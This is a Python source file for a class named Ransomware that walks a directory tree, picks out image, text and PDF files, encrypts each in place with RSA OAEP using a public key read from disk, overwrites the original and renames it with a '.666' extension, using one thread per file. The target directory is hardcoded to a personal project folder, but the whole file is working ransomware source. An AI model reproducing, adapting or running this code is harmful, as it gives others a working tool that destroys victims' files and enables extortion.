import dataclasses
import os
import threading
import time
from getpass import getuser
from pathlib import Path
from typing import List
from Crypto import Cipher
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from dataclasses import dataclass
from Crypto.PublicKey.RSA import RsaKey


@dataclass
class Ransomware:
    def __init__(self):
        self.__files: List[str] = [
            ".jpg", ".png", ".txt", ".pdf"
        ]  # write extensions here
        self.__public_key: bytes or None = None
        self.__BLOCK_SIZE: hex = 0xA0
        self.__public_key_path: str = '../../Keys/public_key.pem'

    def __get_public_key(self) -> RsaKey:
        with open(self.__public_key_path, 'rb') as f:
            self.__public_key = RSA.import_key(f.read())
        return self.__public_key

    def __get_cipher(self) -> Cipher:
        return PKCS1_OAEP.new(self.__get_public_key())

    def __rename_file(self, file: str) -> None:
        os.rename(file, file + ".666")

    def __find_files(self) -> None:
        home: str = f"/home/{getuser()}/PycharmProjects/ransonware/src/Ransomware"
        for root, dirs, files in os.walk(home):
            for names in files:
                if Path(os.path.join(root, names)).suffix in self.__files:
                    threading.Thread(target=self.__encrypt, args=(os.path.join(root, names), )).start()

    def __encrypt(self, file: str) -> None:
        encrypted_data = bytearray()
        cipher = self.__get_cipher()

        with open(file, 'rb') as f:
            while True:
                chunk = f.read(self.__BLOCK_SIZE)
                if not chunk:
                    break
                encrypted_chunk = cipher.encrypt(chunk)
                encrypted_data.extend(encrypted_chunk)

        with open(file, 'wb') as f:
            f.write(encrypted_data)
            self.__rename_file(file)

    def run(self) -> None:
        self.__find_files()


if __name__ == '__main__':
    ransomware: Ransomware = Ransomware()
    ransomware.run()
